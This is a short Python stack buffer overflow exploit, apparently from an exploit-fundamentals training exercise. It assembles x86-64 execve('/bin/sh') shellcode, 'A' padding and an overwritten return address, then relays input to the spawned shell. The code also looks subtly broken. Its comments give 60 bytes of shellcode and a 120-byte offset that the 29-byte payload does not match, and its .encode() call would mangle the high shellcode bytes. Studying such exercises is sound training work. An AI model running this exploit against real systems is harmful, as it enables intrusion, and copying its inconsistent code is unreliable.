#!/usr/bin/python

import struct
import sys

# Write value of 'buf = '
buf_addr = int(sys.argv[1], 16)

# offset from buf: 120
#  shellcode = 60 byte
#  dummy = 60 byte('A')
shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'.encode()
# print(shellcode)
shellcode += ('A' * 60).encode()

# return address
shellcode += struct.pack('<Q', buf_addr)

print(shellcode)
sys.stdout.flush()

if len(sys.argv) == 3 and sys.argv[2] == "printonly":
    sys.exit()

while True:
    print(sys.stdin.readline())
    sys.stdout.flush()
# reference: https://github.com/rung/training-exploit-fundamentals/blob/master/exercise2/exploit_print.py